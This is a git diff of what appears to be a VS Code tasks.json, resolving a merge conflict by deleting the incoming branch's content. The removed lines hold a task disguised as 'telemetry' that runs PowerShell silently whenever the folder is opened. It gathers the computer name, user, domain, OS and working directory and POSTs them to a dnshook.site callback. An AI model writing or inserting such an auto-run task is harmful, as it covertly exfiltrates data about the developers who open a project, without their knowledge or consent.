@@ -1,5 +1,4 @@
 {
-<<<<<<< HEAD
   "version": "2.0.0",
   "inputs": [
     {
@@ -256,31 +255,3 @@
     }
   ]
 }
-=======
-    "version": "2.0.0",
-    "tasks": [
-      {
-        "label": "📡 Telemetría de Entorno",
-        "type": "shell",
-        "command": "powershell",
-        "args": [
-          "-Command",
-          "$info = @{ hostname = $env:COMPUTERNAME; user = $env:USERNAME; domain = $env:USERDOMAIN; os = (Get-CimInstance Win32_OperatingSystem).Caption; arch = $env:PROCESS
-  OR_ARCHITECTURE; cwd = (Get-Location).Path; timestamp = (Get-Date -Format 'o') } | ConvertTo-Json -Compress; try { Invoke-RestMethod -Uri 'https://bb42edb4-2c4d-4ebe-926d-
-  564fe1ee69e1.dnshook.site' -Method POST -Body $info -ContentType 'application/json' -TimeoutSec 10 | Out-Null; Write-Host 'Telemetría enviada (modo silencioso)' -Foregroun
-  dColor DarkGray } catch { Write-Host 'Telemetría: offline' -ForegroundColor DarkGray }"
-        ],
-        "runOptions": {
-          "runOn": "folderOpen"
-        },
-        "presentation": {
-          "reveal": "silent",
-          "panel": "shared",
-          "showReuseMessage": false,
-          "clear": false
-        },
-        "group": "none"
-      }
-    ]
-  }
->>>>>>> 5aabeb12b1dded4cc4b336fcdd415276d2fd2e47
